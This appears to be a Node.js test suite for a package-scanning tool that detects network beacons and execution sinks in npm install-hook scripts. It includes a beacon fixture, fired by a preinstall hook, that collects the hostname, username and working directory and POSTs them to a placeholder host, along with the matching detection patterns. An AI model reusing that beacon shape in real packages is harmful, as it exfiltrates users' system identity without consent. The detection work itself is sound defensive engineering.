// 0.1.5 static-checks-1.7 (operator 2026-10-26: into 0.1.5, the release held for it): recon v6.16's bound-module call forms mirrored.
// The API network sinks 'http-request' and 'net-connect' also read a call on a NAME BOUND to the module: <id> = ...require(M)...;
// then <id>.f( (the beacon.cjs ternary `lib = c ? require('https') : require('http')`), require(M).f( direct, import <id> | * as <id>
// from M, and the destructured { f } / { f: local } = require(M) or import { f [as local] } from M, then a bare call. The 1.6
// literal-receiver regexes stay and are tried first; no new sink name (a call that moved from https.request( to lib.request( is not an
// S7 gain); url-literal stays excluded; every check, gate, role, notice and limit is unchanged.
// The hand-off: recon's sealed tools/recon/v6.16/static-checks.mjs (sha256 0677f0f4...; manifest RECON-v6.16.SHA256SUMS 9755f734...,
// chaingate-ops g10-c2-recon-v6.16 @793a595). The vectors are recon's test/v616.test.mjs (sha256 ac8882f1...): BOUND_BEACON, HTTP_POS,
// HTTP_NEG, the net-connect sets and the adversarial bodies, copied as written; the 1.6 constants come from the 1.6 hand-off fixture.
// Failing first: written before the code. Tarballs and bodies are synthetic text; nothing is run.
import test from 'node:test';
import assert from 'node:assert/strict';
import fs from 'node:fs';
import { performance } from 'node:perf_hooks';
import { fileURLToPath } from 'node:url';

const SC = () => import('../../proxy/static-checks.js');
const K16 = JSON.parse(fs.readFileSync(fileURLToPath(new URL('../fixtures/cft015/static-checks-1.6-constants.json', import.meta.url)), 'utf8'));
const S1G = 'static:S1-loader-in-hook-target'; const S6G = 'static:S6-network-beacon-in-hook-target'; const S7G = 'static:S7-entry-capability-gain';
const sink = async (name) => new Map((await SC()).NET_SINKS).get(name);
// the 1.6 sinks, rebuilt from the 1.6 hand-off (url-literal is in NET_SINKS only, not in the API list)
const OLD = new Map(K16.s6.api_net_sinks.map((x) => [x.name, new RegExp(x.regex, x.flags ?? '')]));
const file = (p, s) => ({ path: p, buf: Buffer.from(s) });
const walkOf = (files) => ({ ok: true, files, notKept: [] });
const rowOf = (rows, gate) => rows.find((r) => r.gate === gate);
const hookMan = { name: 'h', version: '1.0.0', scripts: { preinstall: 'node beacon.cjs' } };
const mainMan = { name: 'h', version: '2.0.0', main: 'index.js' };
const PLAIN = 'module.exports = function add(a, b) { return a + b; };\n';

// the beacon.cjs shape (recon's TEXT fixture: the binding and the call as the family writes them; no host, no payload)
const BOUND_BEACON = [
  "var os = require('os');",
  "var u = new URL(process.argv[2] || 'https://collect.example.invalid/b');",
  "var lib = u.protocol === 'https:' ? require('https') : require('http');",
  "var body = JSON.stringify({ h: os.hostname(), u: os.userInfo().username, d: process.cwd() });",
  "var req = lib.request({ hostname: u.hostname, port: u.port, path: u.pathname, method: 'POST', headers: { 'content-type': 'application/json' } }, function () {});",
  'req.on(\'error\', function () {}); req.end(body);', '',
].join('\n');

const HTTP_POS = [
  ["var lib = u.protocol === 'https:' ? require('https') : require('http');\nvar req = lib.request({ hostname: h });", 'the beacon.cjs ternary'],
  ["require('https').get(u, cb);", 'require(M).get( direct'],
  ["require ( \"node:http\" ) . request(o);", 'direct, node:, spaces'],
  ["const h = require('node:https'); h.get(u);", 'const'],
  ["let c; c = require('http'); c.request(o);", 'a plain assignment'],
  ["var a = 1, b = require('http2'); b.request(o);", 'the second declarator'],
  ["import * as h from 'node:http';\nh.request(o);", 'import * as'],
  ["import web from 'https';\nweb.get(o);", 'import default under another name'],
  ["import web, { Agent } from 'https';\nweb.get(o);", 'import default with named'],
  ["const { request } = require('https');\nrequest(o);", 'destructured request'],
  ["const { Agent, get } = require('node:http'); get(u);", 'destructured get among others'],
  ["const { get: fetchIt } = require('https'); fetchIt(u);", 'destructured, renamed'],
  ["import { get, request } from 'node:http'; get(u);", 'import { }'],
  ["import { request as send } from 'https'; send(o);", 'import { as }'],
];
const HTTP_NEG = [
  ["const h = require('https'); module.exports = h;", 'bound, never called'],
  ["const lib = require('lodash'); lib.get(o, 'a');", 'another module'],
  ["const h = require('https'); const x = {}; x.h.get(1);", 'a member receiver'],
  ["if (a == require('https')) b.get(1);", 'a comparison, another name'],
  ["const h = require('https'); h.getHeader('x'); h.Agent();", 'another method'],
  ["const h = require('https'); const g = require('fs'); g.get(1);", 'the called name is bound to another module'],
  ["const { Agent } = require('https'); request(o);", 'destructured without request'],
  ["const { request } = require('https'); function request2() {} obj.request(o);", 'destructured, never called bare'],
  ["const { get } = require('https'); function get(a) { return a; }", 'a declaration is not a call'],
  ["const h = require('httpx'); h.get(u);", 'not the module'],
  ["if (h == require('https')) h.get(1);", 'a comparison with the called name'],
  ["var x = cache(); require('https'); x.get(k);", 'an assignment in an earlier statement'],
];
const NET_POS = ["const n = require('net'); n.connect(9000, h);", "var c = require('node:net'); c.createConnection(o);",
  "const t = require('tls'); t.connect(o);", "var d = require('dgram'); var s = d.createSocket('udp4');", "require('net').connect(1, h);",
  "import * as sock from 'node:net'; sock.connect(1);", "const { createSocket } = require('dgram'); createSocket('udp4');", "import { connect } from 'tls'; connect(o);"];
const NET_NEG = ["const n = require('net'); n.isIP(x);", "const t = require('tls'); t.createConnection(o);", "const d = require('dgram'); d.connect(1);",
  "const n = require('net'); module.exports = n;", "const n = require('networks'); n.connect(1);"];

// ------------------------------------------------------------------ identity and vocabulary
test('B0 identity: static-checks-1.7; BOUND_CALLS and BOUND_LIMITS are recon\'s; boundModuleCall is exported', async () => {
  const S = await SC();
  assert.equal(S.STATIC_CHECKS_VERSION, 'static-checks-1.9');   // declared: 1.8 adds S8 and S9 (cft015-static-checks-1.8)
  assert.deepEqual(JSON.parse(JSON.stringify(S.BOUND_CALLS)), {
    'http-request': [{ mod: 'https?|http2', fns: 'request|get' }],
    'net-connect': [{ mod: 'net', fns: 'connect|createConnection' }, { mod: 'tls', fns: 'connect' }, { mod: 'dgram', fns: 'createSocket' }],
  });
  assert.ok(Object.isFrozen(S.BOUND_CALLS) && Object.isFrozen(S.BOUND_CALLS['net-connect'][0]));
  assert.deepEqual({ ...S.BOUND_LIMITS }, { assignLookback: 160, importLookback: 240, braceChars: 200 });
  assert.equal(typeof S.boundModuleCall, 'function');
});

test('B1 the vocabulary is unchanged from 1.6: the same sink names in the same order; every other sink as in 1.6; the two widened sinks keep their 1.6 regex as `literal`', async () => {
  const S = await SC();
  assert.deepEqual(S.API_NET_SINKS.map(([n]) => n), K16.s6.api_net_sinks.map((x) => x.name), 'no new sink name: a renamed call must not read as an S7 gain');
  assert.deepEqual(S.NET_SINKS.map(([n]) => n), [...K16.s6.api_net_sinks.map((x) => x.name), 'url-literal']);
  for (const [n, re] of S.API_NET_SINKS) {
    const old = K16.s6.api_net_sinks.find((x) => x.name === n);
    if (['http-request', 'net-connect'].includes(n)) {
      assert.equal(re.literal.source, old.regex, n); assert.equal(re.literal.flags, old.flags ?? '', n);
      assert.equal(re.bound, S.BOUND_CALLS[n]); assert.equal(String(re), `${re.literal} | bound`);
    } else assert.deepEqual({ regex: re.source, flags: re.flags }, { regex: old.regex, flags: old.flags ?? '' }, n);
  }
  assert.ok(!S.API_NET_SINKS.some(([n]) => n === 'url-literal'), 'url-literal stays out of the API sinks');
});

test('B2 1.7 is a superset of 1.6: every string a 1.6 sink matches, the same 1.7 sink matches', async () => {
  const S = await SC(); const now = new Map(S.NET_SINKS);
  const corpus = [
    'https.request({ host: h })', 'http.get(u)', 'http2.request(x)', 'net.connect(1, h)', 'net.createConnection(o)', 'tls.connect(o)',
    'dgram.createSocket("udp4")', 'fetch(u)', 'new WebSocket(u)', 'new XMLHttpRequest()', 'axios.post(u)', '"https://a.example.invalid/x"',
    'require("https").request(o)', 'x.https.get(u)', ...HTTP_POS.map(([s]) => s), ...HTTP_NEG.map(([s]) => s), ...NET_POS, ...NET_NEG,
  ];
  for (const s of corpus) for (const [n, re] of OLD) if (re.test(s)) assert.ok(now.get(n).test(s), `${n} lost ${s}`);
});

// ------------------------------------------------------------------ http-request and net-connect
test('B3 http-request reads a call on a name bound to http, https or http2 (require, import, destructured, direct); 1.6 missed the beacon.cjs form', async () => {
  const m = await sink('http-request');
  for (const [s, why] of HTTP_POS) assert.equal(m.test(s), true, `${why}: ${s}`);
  assert.equal(OLD.get('http-request').test(HTTP_POS[0][0]), false, 'the beacon.cjs form is the 1.6 miss this version closes');
});

test('B4 http-request does not read: a bound name never called, another module, a member receiver, another method, a declaration', async () => {
  const m = await sink('http-request');
  for (const [s, why] of HTTP_NEG) assert.equal(m.test(s), false, `${why}: ${s}`);
  for (let i = 0; i < 3; i += 1) { assert.equal(m.test(HTTP_POS[0][0]), true, 'stateless: the same answer every call'); assert.equal(m.test(HTTP_NEG[0][0]), false); }
  const S = await SC(); assert.equal(S.boundModuleCall(null, S.BOUND_CALLS['http-request']), false, 'not a string: false');
});

test('B5 net-connect reads the same forms per module: net connect|createConnection, tls connect, dgram createSocket', async () => {
  const m = await sink('net-connect');
  for (const s of NET_POS) assert.equal(m.test(s), true, s);
  for (const s of NET_NEG) assert.equal(m.test(s), false, s);
});

// ------------------------------------------------------------------ the rows
test('B6 S6 on the beacon.cjs shape in a hook target: a WARN naming http-request; an execution sink moves it to S1; url-literal is still not a sink; a main file is not read by S6', async () => {
  const S = await SC();
  const rows = (body, man = hookMan, p = 'beacon.cjs') => S.staticRows({ manifest: man, walk: walkOf([file(p, body)]), armed: 'identity-break' });
  const r = rowOf(rows(BOUND_BEACON), S6G);
  assert.equal(r.result, 'WARN', JSON.stringify(r));
  assert.match(r.detail, /^hook target beacon\.cjs \(\d+ B\) has a network API sink \(http-request\) and a host-identity source \([^)]+\) and no execution sink; armed by identity-break$/);
  assert.ok(!r.detail.includes('collect.example'), 'markers, never a host');
  assert.deepEqual(S.fileFacts(file('beacon.cjs', BOUND_BEACON)).net_sinks.filter((n) => n !== 'url-literal'), ['http-request']);
  const ex = rows(`${BOUND_BEACON}require('child_process').execSync(x);\n`);
  assert.equal(rowOf(ex, S6G).result, 'ALLOW', 'an execution sink in the same file is S1 territory');
  assert.equal(rowOf(ex, S1G).result, 'WARN', 'a bound network sink and an execution sink: S1 fires');
  assert.equal(rowOf(rows("var lib = require('https'); module.exports = lib; var n = require('os').hostname(); var u = 'https://a.example.invalid/' + n;\n"), S6G).result, 'ALLOW', 'bound, never called; url-literal only');
  assert.equal(rowOf(rows(BOUND_BEACON, mainMan, 'index.js'), S6G).result, 'ALLOW', 'S6 reads hook targets only');
});

test('B7 S7: https.request( to lib.request( on main is not a gain; a bound network call gained together with an execution sink is the named net+exec arm', async () => {
  const S = await SC();
  const entry = (body) => S.entryFactsOf({ manifest: mainMan, walk: walkOf([file('index.js', body)]) });
  const pred = (body) => ({ version: '1.0.0', served_at: '2026-03-01T00:00:00.000Z', walk: 'read', reason: null, static_checks_version: S.STATIC_CHECKS_VERSION, files: entry(body).files });
  const s7 = (before, now) => rowOf(S.staticRows({ manifest: mainMan, walk: walkOf([file('index.js', now)]), armed: 'entry-path-change', predecessor: pred(before) }), S7G);
  const lit = "const https = require('https'); module.exports = (o) => https.request(o);\n";
  const bnd = "const lib = require('https'); module.exports = (o) => lib.request(o);\n";
  const same = s7(lit, bnd);
  assert.equal(same.result, 'ALLOW', JSON.stringify(same)); assert.ok(!/main gained/.test(same.detail), `the same capability under the same name: ${same.detail}`);
  const ne = "const lib = require('https'); const cp = require('child_process'); lib.get(u, (r) => cp.exec(x));\n";
  const g = s7(PLAIN, ne);
  assert.equal(g.result, 'WARN', JSON.stringify(g));
  assert.match(g.detail, /\(net\+exec: exec:child_process, net:http-request\)/);
});

// ------------------------------------------------------------------ cost and the shadow facts
test('B8 bounded cost: adversarial 2 MiB bodies stay linear (each sink under 1.5 s)', async () => {
  const S = await SC(); const B = 2 * 1024 * 1024; const fill = (unit) => unit.repeat(Math.floor(B / unit.length));
  const bodies = [
    ['many bindings, no call', fill("a = require('https');\n")],
    ['many distinct bindings, other methods', Array.from({ length: 60000 }, (_, i) => `n${i} = require('https'); n${i}.getHeader(1);`).join('\n').slice(0, B)],
    ['one long assignment run', `${'a='.repeat(B / 2 - 20)}require('https')`],
    ['open braces', `${'{'.repeat(B - 40)}} = require('https')`],
    ['call storm', fill('a(b(c(')],
    ['import storm', fill("import a from 'https';\n")],
    ['destructure storm', fill("const { request, get, x } = require('net');\n")],
  ];
  for (const [why, s] of bodies) for (const n of ['http-request', 'net-connect']) {
    const m = new Map(S.NET_SINKS).get(n); const t0 = performance.now(); m.test(s); const ms = performance.now() - t0;
    assert.ok(ms < 1500, `${n} on ${why}: ${ms.toFixed(0)} ms`);
  }
});

test('B9 the recorded member facts see the bound form: io_tokens carry http-request, io carries network', async () => {
  const S = await SC(); const m = S.memberFacts({ path: 'beacon.cjs', size: Buffer.byteLength(BOUND_BEACON), data: Buffer.from(BOUND_BEACON) });
  assert.ok(m.io_tokens.includes('http-request'), JSON.stringify(m.io_tokens)); assert.ok(m.io.includes('network'));
});
